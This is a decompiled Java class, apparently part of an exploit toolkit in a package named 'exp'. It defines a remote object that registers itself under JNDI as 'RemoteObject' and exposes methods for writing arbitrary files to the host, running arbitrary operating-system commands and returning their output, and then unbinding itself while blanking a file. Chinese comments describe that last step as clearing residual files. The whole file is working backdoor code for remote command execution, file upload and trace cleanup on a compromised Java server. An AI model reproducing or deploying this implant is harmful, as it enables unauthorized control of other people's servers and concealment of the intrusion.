//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package org.secdomain.exp;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import javax.naming.Context;
import javax.naming.InitialContext;

public class RemoteObjectImpl implements RemoteObject {

    /**
     * 分块上传文件
     */
    public boolean upload(String uploadPath, byte[] data, boolean append) {
        FileOutputStream out = null;
        try {
            out = new FileOutputStream(uploadPath, append);
            out.write(data);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        } finally {
            try {
                out.close();
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
    }

    /**
     * 执行命令
     */
    public String exec(String cmd) {
        try {
            Process proc = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(
                    proc.getInputStream()));
            StringBuffer sb = new StringBuffer();
            String line;
            String result;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            result = sb.toString();
            if ("".equals(result)) {
                return "error";
            } else {
                return result;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "error";
        }
    }

    /**
     * 反注册远程类并清除残留文件
     */
    public void unbind(String path) {
        try {
            Context ctx = new InitialContext();
            ctx.unbind("RemoteObject");
        } catch (Exception e) {
            e.printStackTrace();
        }
        FileOutputStream out = null;
        File file = null;
        try {
            file = new File(path);
            out = new FileOutputStream(file);
            out.write("".getBytes());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                out.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    /**
     * 注册远程类
     */
    public static void bind() {
        try {
            RemoteObjectImpl remote = new RemoteObjectImpl();
            Context ctx = new InitialContext();
            ctx.bind("RemoteObject", remote);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
